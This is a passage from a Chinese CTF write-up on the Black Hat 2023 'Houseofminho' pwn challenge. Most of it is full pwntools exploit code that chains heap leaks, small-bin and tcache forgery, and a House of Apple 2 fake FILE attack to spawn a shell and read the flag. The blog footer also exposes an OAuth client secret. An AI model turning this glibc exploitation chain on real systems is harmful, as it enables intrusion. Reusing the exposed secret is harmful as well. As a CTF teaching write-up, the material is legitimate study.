<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">free3(<span class="number">0xd59</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap_base+<span class="number">0x2c0</span>) * <span class="number">2</span> +  <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0xd00</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x10</span>) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x380</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + <span class="number">0x219ce0</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里加上了Small bin的伪造</span></span><br><span class="line">add(<span class="number">1</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x10</span> : &#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x08</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x10</span>: heap_base + <span class="number">0x2c0</span>,</span><br><span class="line">            <span class="number">0x18</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x30</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x38</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x40</span>: heap_base + <span class="number">0x2c0</span>,</span><br><span class="line">            <span class="number">0x48</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x50</span>,</span><br><span class="line"></span><br><span class="line">            <span class="number">0x50</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x58</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x60</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x30</span>,</span><br><span class="line">            <span class="number">0x68</span>: libc_base + <span class="number">0x219d60</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>此时堆布局如下</p>
<p><img src="/p/houseofminho-wp/image-20231118021620888.png" alt="image-20231118021620888"></p>
<p>可以看到出现了错误，不过问题不大，源码时通过BK进行遍历的，在BK位置确实出现了3个Chunk</p>
<p>此时我们就可以malloc(0x80)命中一次Small bin的0x90</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>那么此时堆块就会变成，下面这样！WoW，我们可以控制Tcache bin 0x90位置的fd指针！并且此时0x90位置的Count有3！！！</p>
<p><img src="/p/houseofminho-wp/image-20231118022002073.png" alt="image-20231118022002073"></p>
<p>胜利的曙光就在眼前了，接下来是House of apple 2登场！</p>
<h2 id="House-of-Apple-2"><a href="#House-of-Apple-2" class="headerlink" title="House of Apple 2"></a>House of Apple 2</h2><p>House of Apple 2的教程见<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm%EF%BC%8C%E8%BF%99%E9%87%8C%E8%86%9C%E6%8B%9C%E4%B8%80%E4%B8%8BOrz">https://bbs.kanxue.com/thread-273832.htm，这里膜拜一下Orz</a></p>
<p>经过我的调优可以简化到如下的布局</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system = <span class="number">0x50d60</span> + libc_base</span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: system,</span><br><span class="line">    <span class="number">0xa0</span>: fake_file_addr-<span class="number">0x10</span>, <span class="comment"># wide data</span></span><br><span class="line">    <span class="number">0x88</span>: fake_file_addr+<span class="number">0x100</span>, <span class="comment"># 可写，且内存为0即可</span></span><br><span class="line">    <span class="number">0xD0</span>: fake_file_addr+<span class="number">0x28</span>-<span class="number">0x68</span>, <span class="comment"># wide data vtable</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + <span class="number">0x2160C0</span>, <span class="comment"># vtable  </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>我们需要结合当前的情况在做调整，首先我们需要再次延长可控的空间，方法也简单，毕竟Tcache bin的Count有3，我们可以先伪造一次fd到堆上，再伪造进入<code>_IO_list_all</code></p>
<p>（为何不劫持Tcache bin管理块呢？因为我们只能拥有一个堆块，需要free之后再次malloc才能控制下一个，一旦劫持到Tcachebin 管理块，没有一个合适的size位置，是无法成功free的）</p>
<p>由于大小范围可控需要0xe0长度，所以我们第一个堆块需要扩展一次，使用上面的0x50的堆块对下面0x90tcache的溢出修改，使得布局如下图，这样子Chunk 1申请出来的时候，可以保证能控制到Chunk 2的fd，依旧能继续攻击，也能延长可控范围到0xf0，使得攻击成立，而Chunk 1的size改为0x71是为了防止free之后进入0x90导致后面的Chunk无法取出</p>
<p><img src="/p/houseofminho-wp/houseofminho_tcachebin.png" alt="houseofminho_tcachebin"></p>
<p>那么经过简单的布置，最终攻击<code>_IO_list_all</code>之后，就完成了House of Apple 2的攻击</p>
<h1 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./minho&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5000</span>)</span><br><span class="line">tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Size [1=small / 2=big]: &quot;</span>, tob(size))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">size_content, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Size [1=small / 2=big]: &quot;</span>, size_content)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span> * (<span class="built_in">len</span>-<span class="number">1</span>) + <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show3</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span> * (<span class="built_in">len</span>-<span class="number">1</span>) + <span class="string">b&quot;2&quot;</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free3</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span> * (<span class="built_in">len</span>-<span class="number">1</span>) + <span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free3(<span class="number">0xd59</span>) <span class="comment"># 这一行的作用见上文【伪造Unsorted bin】</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这一部分信息收集见上文【信息收集】</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 见上文【Unlink攻击以及Smallbin伪造攻击实施】</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap_base+<span class="number">0x2c0</span>) * <span class="number">2</span> +  <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0xd00</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x10</span>) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x380</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + <span class="number">0x219ce0</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 见上文【修改Small bin】</span></span><br><span class="line">add(<span class="number">1</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x10</span> : &#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x08</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x10</span>: heap_base + <span class="number">0x2c0</span>,</span><br><span class="line">            <span class="number">0x18</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x30</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x38</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x40</span>: heap_base + <span class="number">0x2c0</span>,</span><br><span class="line">            <span class="number">0x48</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x50</span>,</span><br><span class="line"></span><br><span class="line">            <span class="number">0x50</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x58</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0x60</span>: heap_base + <span class="number">0x2c0</span> + <span class="number">0x30</span>,</span><br><span class="line">            <span class="number">0x68</span>: libc_base + <span class="number">0x219d60</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">_IO_list_all = libc_base + <span class="number">0x21a680</span></span><br><span class="line">system = <span class="number">0x50d60</span> + libc_base</span><br><span class="line"></span><br><span class="line">fake_file = heap_base + <span class="number">0x2e0</span></span><br><span class="line"><span class="comment"># 见上文House of apple 2中解释</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64((heap_base + <span class="number">0x2d0</span> + <span class="number">0x70</span>)^((heap_base)&gt;&gt;<span class="number">12</span>)))</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># 这里是布置House of apple 2</span></span><br><span class="line">add(<span class="number">2</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>+<span class="number">0x10</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>+<span class="number">0x10</span>: system,</span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0x71</span>,</span><br><span class="line">    <span class="number">0x70</span>: _IO_list_all ^((heap_base)&gt;&gt;<span class="number">12</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, flat(&#123;</span><br><span class="line">    <span class="number">0xa0</span>-<span class="number">0x60</span>: fake_file-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xd0</span>-<span class="number">0x60</span>: fake_file+<span class="number">0x28</span>-<span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0xD8</span>-<span class="number">0x60</span>: libc_base + <span class="number">0x2160C0</span>, <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, p64(fake_file))</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;cat /flag*&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/p/houseofminho-wp/image-20231118024517191.png" alt="image-20231118024517191"></p>
<p>Flag获得完结撒花！</p>
</p></div><div class="post-footer"><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>作者: Csome</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-11-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a><i class="fa fa-tag"></i><a class="tag" href="/tags/Pwn/" title="Pwn">Pwn </a><i class="fa fa-tag"></i><a class="tag" href="/tags/2023BlackHat/" title="2023BlackHat">2023BlackHat </a><span>大约6409个字, 21分钟21秒读完</span></div></div></div></div><div class="share"><div class="share-btn linkonly"><a class="fa fa-link" onclick="Utils.copyToClipboard(window.location.href)" ref="sidebar"></a></div><div class="share-btn evernote"><a class="fa fa-share" onclick="Anatolo.share.native()" ref="sidebar"></a></div><div class="share-btn weibo"><a class="fab fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="share-btn twitter"><a class="fab fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5BBlack%20Hat%202023%5D%20Pwn%20Houseofminho%20Csome%20writeup%0Ahttps://blog.csome.cc//p/houseofminho-wp/%0A"></a></div><div class="share-btn mastodon"><a class="fab fa-mastodon" target="_blank" rel="noopener" href="https://mastodonshare.com/?text=%E5%88%86%E4%BA%AB%E6%96%87%E7%AB%A0%EF%BC%9A%0A%0ACsome%20%C2%B7%20%5BBlack%20Hat%202023%5D%20Pwn%20Houseofminho%20Csome%20writeup%0Ahttps://blog.csome.cc//p/houseofminho-wp/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/p/houseofsome-ichunqiu/" title="[2023春秋杯冬季赛]Pwn HouseofSome wp">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/p/house-of-some/" title="Bring back the stack attack -- House of some一种高版本glibc的利用思路">下一篇</a></li></ul></div><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><a id="comments"></a><div id="gitalk_container" style="padding: 10px"></div></div></div></div></div></main-outlet><script>(async function(){ if (Anatolo.search == null) await Anatolo.getMsg("search-init"); Anatolo.search.config = {translation:{posts:"文章",pages:"页面",categories:"分类",tags:"标签",untitled:"(无标题)",} }; })()</script><div class="searchbox ins-search modal-cover"><div class="searchbox-container ins-search-container modal-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="Anatolo.search.closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><button class="float-button hide" id="scroll-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})" type="button" title="回到顶部"><i class="fa fa-angle-up"></i></button><div class="modal-cover" id="success-indicator"><div class="modal-container indicator"><i class="fa fa-check"></i></div></div></body></html>